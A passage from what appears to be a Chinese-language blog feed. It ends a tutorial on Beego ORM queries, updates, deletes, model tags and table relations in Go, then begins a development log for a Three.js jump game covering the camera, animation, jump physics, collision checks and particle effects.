对象来进行高级查询，获取一个 QuerySeter对象的方式为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">o := orm.NewOrm()</span><br><span class="line"><span class="comment">// 获取 QuerySeter 对象，user 为表名</span></span><br><span class="line">qs := o.QueryTable(<span class="string">&quot;user&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以直接使用对象作为表名</span></span><br><span class="line">user := <span class="built_in">new</span>(User)</span><br><span class="line">qs = o.QueryTable(user) <span class="comment">// 返回 QuerySeter</span></span><br></pre></td></tr></table></figure><ul><li><p>qs.Filter：用来过滤查询结果，起到 <strong>包含条件</strong> 的作用</p></li><li><p>qs.Exclude：用来过滤查询结果，起到 <strong>排除条件</strong> 的作用</p></li><li><p>qs.All：返回对应的结果集对象</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> users []*User</span><br><span class="line">num, err := o.QueryTable(<span class="string">&quot;user&quot;</span>).Filter(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;slene&quot;</span>).All(&amp;users)</span><br><span class="line">fmt.Printf(<span class="string">&quot;Returned Rows Num: %s, %s&quot;</span>, num, err)</span><br></pre></td></tr></table></figure></li><li><p>更多用法查看 <a href="https://beego.me/docs/mvc/model/query.md">官方文档</a></p></li></ul><h3 id="4-2-3-更新"><a href="#4-2-3-更新" class="headerlink" title="4.2.3 更新"></a>4.2.3 更新</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">o := orm.NewOrm()</span><br><span class="line">user := User&#123;Id: <span class="number">1</span>&#125;</span><br><span class="line"><span class="keyword">if</span> o.Read(&amp;user) == <span class="literal">nil</span> &#123;</span><br><span class="line">    user.Name = <span class="string">&quot;MyName&quot;</span></span><br><span class="line">    <span class="keyword">if</span> num, err := o.Update(&amp;user); err == <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Println(num)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也可以指定更新的字段：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只更新 Name</span></span><br><span class="line">o.Update(&amp;user, <span class="string">&quot;Name&quot;</span>)</span><br><span class="line"><span class="comment">// 指定多个字段</span></span><br><span class="line"><span class="comment">// o.Update(&amp;user, &quot;Field1&quot;, &quot;Field2&quot;, ...)</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="4-2-4-删除"><a href="#4-2-4-删除" class="headerlink" title="4.2.4 删除"></a>4.2.4 删除</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">o := orm.NewOrm()</span><br><span class="line"><span class="keyword">if</span> num, err := o.Delete(&amp;User&#123;Id: <span class="number">1</span>&#125;); err == <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(num)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-3-模型创建详解"><a href="#4-3-模型创建详解" class="headerlink" title="4.3 模型创建详解"></a>4.3 模型创建详解</h2><p>我们通常要创建一个 struct 作为 ORM 中的 Model，在初始化阶段会根据这个结构体创建数据库表，所以在创建这些 Model 时，实际上是在创建一张表的映射，其中有许多需要注意的地方。</p><h3 id="4-3-1-字段的命名规范"><a href="#4-3-1-字段的命名规范" class="headerlink" title="4.3.1 字段的命名规范"></a>4.3.1 字段的命名规范</h3><p>首先我们推荐使用大写字母开头的驼峰命名法来对结构体的属性进行命名，命名通常会有以下特性：</p><ul><li>创建的结构体中的名字，生成数据库会将大写转为小写，将驼峰命名法之间改为下划线分隔。</li><li><code>RunSyncdb()</code> 方法的第二个参数设置为 false 时，字段发生变动后，会保留原有的字段并创建一个新字段。</li></ul><p>如结构：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span>&#123;</span><br><span class="line">    Name String</span><br><span class="line">    Age <span class="type">int</span></span><br><span class="line">    BirthDay time.Time</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成的表为：</p><table><thead><tr><th>字段</th><th>类型</th></tr></thead><tbody><tr><td>name</td><td>string</td></tr><tr><td>age</td><td>int32</td></tr><tr><td>birth_day</td><td>time</td></tr></tbody></table><h3 id="4-3-2-字段的属性设置"><a href="#4-3-2-字段的属性设置" class="headerlink" title="4.3.2 字段的属性设置"></a>4.3.2 字段的属性设置</h3><p>在设置了字段类型后，可以在后面通过 <code>orm:</code>  来追字段的属性。</p><p>设置主键：<code>pk</code></p><p>设置自增：<code>auto</code></p><p>如设置一个自增的主键：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Id <span class="type">int</span> <span class="string">`orm: &quot;pk;auto&quot;`</span></span><br></pre></td></tr></table></figure><p>当 Field 类型为 int, int32, int64, uint, uint32, uint64 时，可以设置字段为自增健, 当模型定义里没有主键时，符合上述类型且名称为 Id 的 Field 将被视为自增键。</p><p>设置默认值 <code>orm:&quot;default(11)&quot;</code></p><p>设置长度 <code>orm:&quot;size(100)&quot;</code></p><p>设置允许为空 <code>orm:&quot;null&quot;</code>，数据库默认是非空，设置 <code>null</code> 之后就可以变为<code>ALLOW NULL</code></p><p>设置唯一： <code>orm:”unique”</code></p><p>设置浮点数精度 <code>orm:&quot;digits(12);decimals(4)&quot;</code>  总共12位，四位是小数位</p><p>设置时间： <code>orm:&quot;auto_now_add;type(datetime)&quot;</code></p><p><strong>auto_now 每次 model 保存时都会对时间自动更新</strong></p><p><strong>auto_now_add 第一次保存时才设置时间</strong></p><p>设置时间的格式：type</p><h3 id="4-3-3-一对多关系的创建"><a href="#4-3-3-一对多关系的创建" class="headerlink" title="4.3.3 一对多关系的创建"></a>4.3.3 一对多关系的创建</h3><p>如果两张表之间存在一对多关系，则需要外键来连接两张表，如多篇文章对应一个文章类型，可以按照如下定义：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Article <span class="keyword">struct</span>&#123;</span><br><span class="line">    Id <span class="type">int</span></span><br><span class="line">    Content <span class="type">string</span></span><br><span class="line">    ArticleType *ArticleType <span class="string">`orm:&quot;rel(fk)&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ArticleType <span class="keyword">struct</span>&#123;</span><br><span class="line">    Id <span class="type">int</span></span><br><span class="line">    TypeName <span class="type">string</span></span><br><span class="line">    Articles[] *Articles <span class="string">`orm:&quot;reverse(many)&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当查询时，我们需要使用 <code>RelatedSel()</code> 指定连接的表，如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">o := orm.NewOrm()</span><br><span class="line"><span class="keyword">var</span> articles[]models.Article</span><br><span class="line">o.QueryTable(<span class="string">&quot;Article&quot;</span>).RelatedSel(<span class="string">&quot;ArticleType&quot;</span>).Filter(<span class="string">&quot;Article__TypeName&quot;</span>, <span class="string">&quot;文章类型&quot;</span>).All(&amp;articles)</span><br></pre></td></tr></table></figure><p>当插入时，我们将外键关联的 Model 对象直接传入即可，如我们添加一个文章，并关联该文章的类型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typeName := ”文章类型“</span><br><span class="line"><span class="keyword">var</span> artiType model.ArticleType</span><br><span class="line">artiType.TypeName = typeName</span><br><span class="line">err = o.Read(&amp;artiType, <span class="string">&quot;TypeName&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span>&#123;</span><br><span class="line">    beego.Info(<span class="string">&quot;类型不存在&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">article.ArticleType = &amp;artiType</span><br><span class="line">article.Content = <span class="string">&quot;... ...&quot;</span></span><br><span class="line"><span class="comment">// 插入数据</span></span><br><span class="line">_,err = o.Insert(&amp;article)</span><br><span class="line"><span class="comment">// ... ...</span></span><br></pre></td></tr></table></figure><h3 id="4-3-3-多对多关系的创建"><a href="#4-3-3-多对多关系的创建" class="headerlink" title="4.3.3 多对多关系的创建"></a>4.3.3 多对多关系的创建</h3><p>同时我们还存在多对多的关系，如一个用户可以喜欢多篇文章，一篇文章也可以被多个用户喜欢：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span>&#123;</span><br><span class="line">    Id <span class="type">int</span></span><br><span class="line">    Name String</span><br><span class="line">    Articles[]*Article <span class="string">`orm:&quot;rel(m2m)&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Article <span class="keyword">struct</span>&#123;</span><br><span class="line">    Id <span class="type">int</span></span><br><span class="line">    Content <span class="type">string</span></span><br><span class="line">    ArticleType *ArticleType <span class="string">`orm:&quot;rel(fk)&quot;`</span></span><br><span class="line">    User[] *Users <span class="string">`orm:&quot;reverse(many)&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样创建完成后，会自动多出一张关系表 user_articles：</p><table><thead><tr><th>字段</th><th>类型</th></tr></thead><tbody><tr><td>id</td><td>bigint(20)</td></tr><tr><td>user_id</td><td>int(11)</td></tr><tr><td>article_id</td><td>int(11)</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 后端 </category>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 快速使用 </tag>
            
            <tag> BeeGo </tag>
            
            <tag> ORM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Three.js实现的跳一跳小游戏开发日志</title>
      <link href="/2019/09/7a8d47034db5.html"/>
      <url>/2019/09/7a8d47034db5.html</url>
      
        <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>项目用到的技术有 </p><ul><li>ES6</li><li>Canvas</li><li>ThreeJS</li><li>WebGL</li><li>微信小游戏开放能力</li></ul><p><a href="https://github.com/EsunR/JumpToJump">关联项目</a></p><h1 id="MVC模式概览"><a href="#MVC模式概览" class="headerlink" title="MVC模式概览"></a>MVC模式概览</h1><p><img src="http://img.cdn.esunr.xyz/MVC.png" alt="MVC.jpg"></p><h1 id="Camera-相机"><a href="#Camera-相机" class="headerlink" title="Camera 相机"></a>Camera 相机</h1><blockquote><p>src/scene/camera.js</p></blockquote><p>Camera 是场景的一部分，采用单例模式，游戏中只存在一个相机实例。</p><p>游戏中的相机采用 <code>OrthographicCamera</code> 正交相机，初始时相机的位置为空间坐标下的 <code>(-10, 10, 10)</code>，眺望点为世界坐标轴中心。</p><p>同时相机的可视空间范围由视锥大小与手机屏幕成比例计算，视锥标准值存放于 <code>scene-conf.js</code> 文件中，计算公式如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">instance</span> = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">OrthographicCamera</span>(</span><br><span class="line">  -sceneConf.<span class="property">frustumSize</span>, <span class="comment">// left</span></span><br><span class="line">  sceneConf.<span class="property">frustumSize</span>, <span class="comment">// right</span></span><br><span class="line">  sceneConf.<span class="property">frustumSize</span> * aspect, <span class="comment">// top </span></span><br><span class="line">  -sceneConf.<span class="property">frustumSize</span> * aspect, <span class="comment">// bottom</span></span><br><span class="line">  -<span class="number">100</span>, <span class="number">85</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="Scene-场景"><a href="#Scene-场景" class="headerlink" title="Scene 场景"></a>Scene 场景</h1><blockquote><p>src/scene/scene.js</p></blockquote><p>Scene 是场景管理器，采用单例模式，因为游戏中只存在一个 Scene，导出的即为一个实例化后的场景，其 <code>THREE.Scene</code> 实例挂载在 <code>instance</code> 对象上。</p><p>在 <code>init()</code> 函数中进行场景的初始化，主要负责实例化 <code>THREE.Scene</code>，将相机、光线这些全局的元素引入到场景中，并进行初始化等操作。</p><p>在系统定义的 Scene 中，主要是用于管理整个场景的变化。同时涉及光线与相机的操作（如相机的位移），必须作为 Scene 的方法，在外部调用 Scene 实例的方法，从而进行操作与更改，这样做的好处是能够将操作更加集中，并且减少重复的函数编写。</p><blockquote><p>由于分数是在相机坐标系上添加的，所以也必须在 Scene 上定义分数更新、添加的操作（因为这些操作设计操作到相机实例）</p></blockquote><p>若是在场景中添加物体，则可以使用 <code>scene.instance.add()</code> 方法将物体直接添加到场景中，如果在，这也是场景管理器的重要作用之一。</p><h1 id="Light-光线"><a href="#Light-光线" class="headerlink" title="Light 光线"></a>Light 光线</h1><blockquote><p>src/scene/light.js</p></blockquote><p>光线是场景的一部分，采用了单例模式，游戏中只存在一个光线实例。在场景中存在两种光线，环境光（AmbientLight）与平行光（DirectionalLight）。</p><p>由于游戏中的光直接照射地面阴影效果不好，所以在场景中定义了一个平面作为光照的目标，这个平面在 (x, y) 平面之上。</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190906143045.png" alt="20190906143045.png"></p><h1 id="动画系统"><a href="#动画系统" class="headerlink" title="动画系统"></a>动画系统</h1><blockquote><p>lib/animation.js</p></blockquote><p><code>animation.js</code> 是一个动画工具库，该 js 文件向外暴露了 <code>customAnimation</code> 对象以及 <code>TweenAnimation()</code> 方法。</p><p><code>customAnimation.to()</code> 方法是建立用户动画的主要方法，其有如下几个参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(customAnimation.to function)(duration: any, from: any, to: any, type: any, delay?: number, complateCallback: any): void</span><br><span class="line"></span><br><span class="line">duration: 动画时长</span><br><span class="line">from: 动画操作对象的属性，如 bottle.instruction.position</span><br><span class="line">to: 动画结束后操作对象的属性值</span><br><span class="line">type: 动画类型，具体见 tween.js</span><br><span class="line">delay: 动画延时（可选，默认为0）</span><br><span class="line">complateCallback：动画结束后的回调函数（可选）</span><br></pre></td></tr></table></figure><p>在 <code>customAnimation.to()</code> 内部调用了 <code>TweenAnimation()</code>，该方法负责了当前时刻所操作物体属性的具体值，其内部主要做了如下的操作：</p><ol><li>对方法参数的检测，由传入的参数来获取动画的计算函数；</li><li>预计算动画在传入时间内需要渲染的帧数，并将标识参数重置；</li><li>对每一帧进行绘制，通过两帧动画绘制的时间间隔求出当前的帧率； <code>fps = Math.ceil(1000 / interval)</code></li><li>当fps小于30时，对动画进行补帧，将帧数标识符累加到当前时刻应渲染的数量； <code>increment = Math.floor((interval / 17))</code></li><li>如果帧率大于30fps，执行回调函数，将当前计算的数值计算结果返回；</li><li>检查是否所有动画帧都已经渲染完毕，如果未渲染完毕，使用 <code>requestAnimationFrame()</code> 执行自身函数。</li></ol><p>简单的工作流如下：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190906150614.png" alt="20190906150614.png"></p><h1 id="瓶身跳跃"><a href="#瓶身跳跃" class="headerlink" title="瓶身跳跃"></a>瓶身跳跃</h1><p>Bottle的跳跃实际上是在一个方向向量上的移动，获取了跳跃的方向向量，之后再计算跳跃的目标点，然后通过 <code>customAnimation.to()</code> 方法添加移动的动画，就可以完成一个跳跃效果。</p><h3 id="计算向量"><a href="#计算向量" class="headerlink" title="计算向量"></a>计算向量</h3><blockquote><p>gamePage.setDirection()</p></blockquote><p>首先要获取跳跃的方向向量，其重点在于获取两个坐标：</p><ul><li>Bottle自身坐标</li><li>下一个Block的中心坐标</li></ul><p>这两点之间的连线就可以确定Bottle的移动方向。Bottle自身坐标可以通过 <code>position</code> 属性来获得，我们将其记为 <code>currentPosition</code> 挂载与 game-page 实例上，而下一个Block的中心坐标就是该Block生成时的坐标，在生成下一个Block时将其坐标信息记为 <code>targetPosition</code> 挂载于 game-page 实例上。之后通过 <code>THREE.Vector3()</code> 将两点转化为一个向量信息，在通过 <code>normalize()</code> 方法将其转换为一个单位向量，将单位向量传入到 bottle 实例的 <code>setDirection()</code> 方法中，由方法内部将信息挂载到 bottle 实例上。之后，可以调用 bottle 实例上的 <code>axis</code> 属性以及 <code>direction</code> 属性来获取跳跃的方向信息。</p><p>之后拥有了跳跃方向后，通过计算 touchstart 事件与 touchend 事件之间的时间间隔，即可以按照公式计算出竖直上抛运动的初始速度vy与vx，将其挂载与 bottle 实例上的 <code>velocity</code> 属性中，将其用于计算。</p><h3 id="计算公式"><a href="#计算公式" class="headerlink" title="计算公式"></a>计算公式</h3><blockquote><p>src/object/bottle.js</p></blockquote><p>水平方向的计算公式为：<code>translateH = vx * △t</code></p><p>竖直方向的计算公式为：<code>translateY = vy * △t- 0.5 * gravity * △t * △t - gravity * flyingTime * △t</code></p><p>只要将水平方向的移动增量加上方向向量，就可以在水平方向上移动Bottle瓶身：<code>this.obj.translateOnAxis(this.axis, translateH)</code></p><p>竖直方向则只需变换Y轴坐标位置即可：<code>this.obj.translateY(translateY)</code></p><h1 id="预判及碰撞检测"><a href="#预判及碰撞检测" class="headerlink" title="预判及碰撞检测"></a>预判及碰撞检测</h1><blockquote><p>gamePage.getHitStatus()</p></blockquote><p>当用户按压屏幕时，Bottle以及Block开始进行压缩的动画，用户将手指移开屏幕即发生 <code>touchend</code> 事件时，就开始使用 <code>getHitStatus()</code> 方法进行Bottle的落地点预判。</p><p>预判主要为了给Bottle每次跳跃的状态，以下几个常量用来定义Bottle跳跃后的状态：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// game-page.js</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">GAME_OVER_NORMAL</span> = <span class="number">0</span> </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HIT_NEXT_BLOCK_CENTER</span> = <span class="number">1</span> </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HIT_CURRENT_BLOCK</span> = <span class="number">2</span> </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">GAME_OVER_NEXT_BLOCK_BACK</span> = <span class="number">3</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">GAME_OVER_CURRENT_BLOCK_FRONT</span> = <span class="number">4</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">GAME_OVER_NEXT_BLOCK_FRONT</span> = <span class="number">5</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">HIT_NEXT_BLOCK_NORMAL</span> = <span class="number">6</span></span><br></pre></td></tr></table></figure><p>通过公式计算出Bottle的预估落地点后，通过 <strong>射线法</strong> 来计算落地点是否在Block上，根据不同的结果可以将Bottle的跳跃结果定义为以上的常量。但要注意的是Bottle有可能仍落在当前的Block上，所以进行射线法判定跳跃点时，既要判断 <code>nextBlock</code> 又要判断 <code>currentBlock</code>。</p><p>关于射线法的计算，需要得到所计算Block的上平面顶点坐标，具体的计算方法挂载在Block的抽象类上（src/block/base.js），调用 <code>block.getVertices()</code> 即可获取平面的四个顶点数组用于射线法的计算。关于射线法的具体算法存放在 <code>src/utils/index.js</code> 的 <code>pointInPolygon()</code> 方法中。</p><h1 id="计分系统"><a href="#计分系统" class="headerlink" title="计分系统"></a>计分系统</h1><blockquote><p>src/view3d/scoreText</p></blockquote><p>计分系统需要使用到字体文件，字体文件存放在 <code>src/view3d/font.js</code> 文件下。</p><p>在 <code>font.js</code> 中，使用 <code>import</code> 引入一个单独的 THREE JS 可以防止缺少依赖。font 字体为 json 格式，将其存放在 <code>font</code> 变量中后，使用 <code>new THREE.Font(font)</code> 实例化一个字体对象 <code>fontObj</code>。将字体对象导出后，就可以提供给外部使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> <span class="variable constant_">THREE</span> <span class="keyword">from</span> <span class="string">&#x27;../../libs/three.js&#x27;</span></span><br><span class="line"><span class="keyword">const</span> font = &#123;...&#125;</span><br><span class="line"><span class="keyword">const</span> fontObj = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Font</span>(font)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> fontObj</span><br></pre></td></tr></table></figure><p>拥有字体文件后，需要有字体实例可以添加到游戏中，这里使用工厂模式，向外提供一个字体对象，将 THREE JS 字体对象绑定在 <code>instance</code> 属性上：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">init</span>(<span class="params">options</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">material</span> = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">MeshBasicMaterial</span>(&#123;</span><br><span class="line">    <span class="attr">color</span>: (options &amp;&amp; options.<span class="property">fillStyle</span>) ? options.<span class="property">fillStyle</span> : <span class="number">0xffffff</span>,</span><br><span class="line">    <span class="attr">transparent</span>: <span class="literal">true</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> (options &amp;&amp; options.<span class="property">opacity</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">material</span>.<span class="property">opacity</span> = options.<span class="property">opacity</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">options</span> = options || &#123;&#125;</span><br><span class="line">  <span class="keyword">const</span> geometry = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">TextGeometry</span>(<span class="string">&#x27;0&#x27;</span>, &#123;</span><br><span class="line">    <span class="string">&quot;font&quot;</span>: font,</span><br><span class="line">    <span class="string">&quot;size&quot;</span>: <span class="number">6.0</span>,</span><br><span class="line">    <span class="string">&quot;height&quot;</span>: <span class="number">0.1</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">instance</span> = <span class="keyword">new</span> <span class="variable constant_">THREE</span>.<span class="title class_">Mesh</span>(geometry, <span class="variable language_">this</span>.<span class="property">material</span>)</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">instance</span>.<span class="property">name</span> = <span class="string">&#x27;scoreText&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于文字随着分数的增加而不断增加，所以在 ScoreText 上要挂载一个 updateScore 的方法来替换 instance 实例，生成一个新的文字，之后再通过场景管理器，将原有的文字删除，重新添加上新的文字实例。其内部过程如下：</p><p><img src="http://img.cdn.esunr.xyz/markdown/20190902200721.png" alt="20190902200721.png"></p><h1 id="暂停动画的逻辑"><a href="#暂停动画的逻辑" class="headerlink" title="暂停动画的逻辑"></a>暂停动画的逻辑</h1><p>在动画函数库中设置两个标识符，<code>animationId</code> 与 <code>stoppedAnimationId</code>。</p><ul><li><code>animationId</code>：用于记录动画ID，每次动画赋予ID都是在这个值上累加</li><li><code>stopAnimationId</code>：标记被暂停的动画</li></ul><p>当一个动画被创建后（<code>TweenAnimation</code> 函数中），会被赋予一个动画ID：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// animation.js</span></span><br><span class="line"><span class="keyword">const</span> selfAnimationId = ++animationId</span><br></pre></td></tr></table></figure><p>同时设定一个判断条件，如果当前的动画 ID 小于 <code>stoppedAnimationId</code>，就跳过动画的执行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// animation.js</span></span><br><span class="line"><span class="keyword">if</span> (start &lt;= frameCount &amp;&amp; selfAnimationId &gt; stoppedAnimationId) &#123;</span><br><span class="line">  options.<span class="title function_">callback</span>(value)</span><br><span class="line">  <span class="title function_">requestAnimationFrame</span>(step)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (start &gt; frameCount &amp;&amp; selfAnimationId &gt; stoppedAnimationId) &#123;</span><br><span class="line">  <span class="comment">// 参数true用于检测该回调是否是完成时的回调函数</span></span><br><span class="line">  options.<span class="title function_">callback</span>(to, <span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个停止动画的操控在 <code>StopAllAnimation()</code> 方法中执行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// animation.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">StopAllAnimation</span>(<span class="params"></span>) &#123;</span><br><span class="line">  stoppedAnimationId = animationId</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>外部调用这个方法可以停止当前场景中的所有动画</p><h1 id="场景复位"><a href="#场景复位" class="headerlink" title="场景复位"></a>场景复位</h1><p>在跳跃场景中，场景中所有的物体都会产生位移，包括Bottle、地面、光线、相机等，同时还会生成大量的Block，当游戏结束时需要对场景进行复位。</p><p>最简便的操作是将场景中的所有物体移除，game-page 实例上的 <code>restart()</code> 方法负责处理重置场景，其中主要进行了如下几个操作：</p><ul><li>调用 <code>bindTouchEvent()</code> 将场景切换时移除的事件重新绑定</li><li>调用 <code>deleteObjectsfromScene()</code> 将场景中所有物体的删除，其中Block的删除操作需要进行遍历删除</li><li>调用各场景物体对象上的 <code>init()</code> 方法，对单个场景物体的参数进行重置</li><li>重新将移除的场景物体加入到场景中</li><li>对分数计数器进行重置</li></ul><h1 id="粒子系统-Particles"><a href="#粒子系统-Particles" class="headerlink" title="粒子系统 Particles"></a>粒子系统 Particles</h1><p>瓶身跳跃时会出现粒子聚合效果，当瓶身落下时会出现粒子发散效果。</p><p>如果要想创建一个粒子效果，则需创建单个粒子个体，将粒子作为瓶身的一部分，添加到瓶身的 Object3D 对象上，构建单个粒子个体的过程在 <code>bottle.js</code> 的 <code>init()</code> 方法中。</p><p>其中粒子贴图分为两种：绿色粒子与白色粒子，其中负责聚合效果的粒子有20个，负责散发效果的粒子有10个。这些粒子在未使用状态下时是不可见的，同时每个粒子贴图都附着在一个独立存在的宽高为2的 PlaneGeometry 对象上，所以实际上粒子只是一个朝向相机的平面贴图。</p><p>同时，每个粒子实体上挂载了两个属性：<code>gathering</code> 与 <code>scattering</code>，分别用来设置当前粒子的状态是正在执行聚合动画还是正在执行发散动画。</p><h3 id="粒子聚合-Gather"><a href="#粒子聚合-Gather" class="headerlink" title="粒子聚合 Gather"></a>粒子聚合 Gather</h3><p><img src="http://img.cdn.esunr.xyz/markdown/20190905110518.png" alt="20190905110518.png"></p><p><code>bottle.js</code> 中的 <code>gatherParticles()</code> 方法负责控制粒子的聚合效果，其内部调用 <code>_gatherParticles(particle)</code> 负责每个粒子的具体动画效果的展现。</p><p><code>gatherParticles()</code> 将每个粒子的 <code>gathering</code> 属性设置为 <code>true</code>，意味着当前粒子正在执行聚合动画，之后将执行聚合动画的单个粒子实例传入到 